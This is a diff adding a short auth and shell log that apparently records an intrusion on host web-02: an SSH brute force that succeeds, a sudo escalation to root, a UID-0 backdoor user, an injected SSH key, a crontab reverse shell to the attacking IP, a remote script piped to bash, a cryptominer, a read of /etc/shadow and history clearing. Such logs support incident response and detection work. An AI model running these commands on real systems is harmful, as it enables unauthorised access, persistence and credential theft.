@@ -1,0 +1,16 @@
+Sep 28 03:14:01 web-02 sshd[20411]: Failed password for invalid user admin from 45.155.205.233 port 51022 ssh2
+Sep 28 03:14:03 web-02 sshd[20413]: Failed password for invalid user oracle from 45.155.205.233 port 51040 ssh2
+Sep 28 03:14:05 web-02 sshd[20415]: Failed password for invalid user test from 45.155.205.233 port 51058 ssh2
+Sep 28 03:14:07 web-02 sshd[20417]: Failed password for deploy from 45.155.205.233 port 51076 ssh2
+Sep 28 03:14:09 web-02 sshd[20419]: Failed password for invalid user ubuntu from 45.155.205.233 port 51094 ssh2
+Sep 28 03:14:11 web-02 sshd[20421]: Failed password for deploy from 45.155.205.233 port 51112 ssh2
+Sep 28 03:14:14 web-02 sshd[20423]: Accepted password for deploy from 45.155.205.233 port 51130 ssh2
+Sep 28 03:14:14 web-02 sshd[20423]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Sep 28 03:15:40 web-02 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
+Sep 28 03:16:02 web-02 useradd[20480]: new user: name=sysupd, UID=0, GID=0, home=/root, shell=/bin/bash
+Sep 28 03:16:30 web-02 bash[20488]: root: echo "ssh-ed25519 AAAAC3Nza...x9 kali@kali" >> /root/.ssh/authorized_keys
+Sep 28 03:17:12 web-02 bash[20488]: root: (crontab -l; echo "@reboot /bin/bash -c 'bash -i >& /dev/tcp/45.155.205.233/4444 0>&1'") | crontab -
+Sep 28 03:18:45 web-02 bash[20488]: root: curl -s http://45.155.205.233/x.sh | bash
+Sep 28 03:19:10 web-02 bash[20488]: root: /tmp/.x/xmrig -o stratum+tcp://pool.minexmr-alt.xyz:4444 -u 44AFFq5kSiGBoZ --donate-level 1
+Sep 28 03:20:02 web-02 bash[20488]: root: cat /etc/shadow
+Sep 28 03:21:30 web-02 bash[20488]: root: history -c
